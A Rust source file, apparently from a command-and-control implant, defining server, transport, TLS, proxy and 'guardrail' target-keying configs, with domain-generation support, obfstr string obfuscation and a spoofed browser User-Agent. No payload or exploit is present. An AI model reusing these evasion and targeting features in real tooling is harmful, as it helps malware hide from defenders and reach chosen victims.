use std::collections::HashMap;
use obfstr::obfstr;
// ============= 统一配置结构体 =============
#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ServerConfig {
    pub address: String,
    pub protocol: ProtocolType,
    pub transport_config: TransportConfig,
    pub tls_config: Option<TlsConfig>,
    pub proxy_config: Option<ProxyConfig>,
    pub domain_suffix: Option<String>,
}

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone, PartialEq)]
pub enum ProtocolType {
    Tcp,
    Http,
    REM
}

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub enum TransportConfig {
    Tcp(TcpConfig),
    Http(HttpRequestConfig),
    Rem(RemConfig),
}

// ============= TCP配置结构体 =============

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct TcpConfig {
    // TCP特有的配置可以在这里添加
    // pub socket_options: Option<SocketOptions>,
}

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct SocketOptions {
    pub nodelay: bool,
    pub reuse_addr: bool,
    pub send_buffer_size: Option<usize>,
    pub recv_buffer_size: Option<usize>,
}

// ============= HTTP配置结构体 =============

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct HttpRequestConfig {
    pub method: String,
    pub path: String,
    pub version: String,
    pub headers: HashMap<String, String>, // 包含所有HTTP头部
}

// ============= REM配置结构体 =============

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct RemConfig {
    pub link: String,
}


// ============= 通用配置结构体 =============

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct MTLSConfig {
    /// 启用mTLS
    pub enable: bool,
    pub client_cert: Vec<u8>,
    pub client_key: Vec<u8>,
    pub server_ca: Vec<u8>,
}

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct TlsConfig {
    pub enable: bool,
    pub version: String,
    pub sni: String,
    pub skip_verification: bool,
    pub mtls_config: Option<MTLSConfig>
}

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ProxyConfig {
    pub proxy_type: String,
    pub host: String,
    pub port: u16,
    pub username: String,
    pub password: String,
}

// ============= Guardrail配置结构体 =============

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct GuardrailConfig {
    pub ip_addresses: Vec<String>,
    pub usernames: Vec<String>,
    pub server_names: Vec<String>,
    pub domains: Vec<String>,
    pub require_all: bool,
}

// ============= 实现方法 =============

// impl Default for TcpConfig {
//     fn default() -> Self {
//         Self {
//         }
//     }
// }

impl HttpRequestConfig {
    pub fn new(method: &str, path: &str, version: &str) -> Self {
        let mut headers = HashMap::new();
        headers.insert(obfstr!("Connection").to_string(), obfstr!("close").to_string());
        headers.insert(obfstr!("User-Agent").to_string(), obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").to_string());
        headers.insert(obfstr!("Content-Type").to_string(), obfstr!("application/octet-stream").to_string());

        Self {
            method: method.to_string(),
            path: path.to_string(),
            version: version.to_string(),
            headers,
        }
    }

    pub fn with_header(mut self, key: &str, value: &str) -> Self {
        self.headers.insert(key.to_string(), value.to_string());
        self
    }

    pub fn build_request(&self, content_length: usize) -> String {
        let mut request = format!("{} {} HTTP/{}\r\n",
                                  self.method, self.path, self.version);

        if content_length > 0 {
            request.push_str(&format!("{}: {}\r\n", obfstr!("Content-Length"), content_length));
        }

        for (key, value) in &self.headers {
            request.push_str(&format!("{}: {}\r\n", key, value));
        }

        request.push_str("\r\n");
        request
    }
}

impl ServerConfig {
    /// 检查是否支持DGA
    pub fn supports_dga(&self) -> bool {
        self.domain_suffix.is_some()
    }

    /// 获取域名后缀
    pub fn get_domain_suffix(&self) -> Option<&String> {
        self.domain_suffix.as_ref()
    }

    /// 检查地址是否为IP地址
    pub fn is_ip_address(&self) -> bool {
        if let Some(colon_pos) = self.address.rfind(':') {
            let host = &self.address[..colon_pos];
            host.parse::<std::net::IpAddr>().is_ok()
        } else {
            self.address.parse::<std::net::IpAddr>().is_ok()
        }
    }

    /// 获取主机地址（不包含端口）
    pub fn get_host(&self) -> String {
        if let Some(colon_pos) = self.address.rfind(':') {
            self.address[..colon_pos].to_string()
        } else {
            self.address.clone()
        }
    }

    /// 获取端口
    pub fn get_port(&self) -> String {
        if let Some(colon_pos) = self.address.rfind(':') {
            self.address[colon_pos..].to_string()
        } else {
            obfstr!(":443").to_string()
        }
    }
}
